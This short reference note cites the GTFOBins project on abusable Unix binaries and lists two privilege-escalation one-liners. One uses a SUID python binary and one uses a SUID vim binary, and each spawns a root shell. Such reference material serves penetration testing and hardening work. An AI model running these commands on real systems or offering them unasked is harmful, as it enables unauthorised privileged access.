https:// gtfobins.github.io

The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells, escalate or maintain elevated privileges, transfer files, spawn bind and reverse shells, and facilitate the other post-exploitation tasks.

``
SUID python

```
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

SUID vim

```shell
vim -c ':!/bin/sh'
```

